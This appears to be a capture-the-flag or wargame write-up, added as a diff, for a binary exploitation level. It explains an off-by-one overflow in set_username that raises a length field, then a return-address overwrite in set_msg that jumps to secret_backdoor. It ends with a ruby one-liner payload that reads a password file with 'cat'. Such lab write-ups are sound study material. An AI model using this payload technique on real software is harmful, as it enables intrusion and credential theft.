@@ -1,0 +1,16 @@
+- in set_username, buff is copied into msg->user but there's a mistake in the for loop,
+41 characters are copied instead of 40
+- msg->user is overflowed and we can set msg->len value to 255
+
+- in set_msg we can now overflow msg->body and overwrite handle_msg return address
+with the address of secret_backdoor
+
+- so we need to write 40 (msg.user size) random bytes followed by the value 255 as
+username and then 192 (msg full size) + 8 (saved rbp) = 200 bytes of random values
+followed by the address of secret_backdoor as message and finally the command that
+will be executed in system
+	- secret_backdoor @ 0x000055555555488c
+
+- we can write our exploit command filling remaining fgets buffers with random values
+	- ruby -e 'print "x" * 40 + "\xff" + "x" * (86 + 192 + 8) +
+	"\x8c\x48\x55\x55\x55\x55\x00\x00" + "\x00" * 815 + "cat /home/users/end/.pass"'
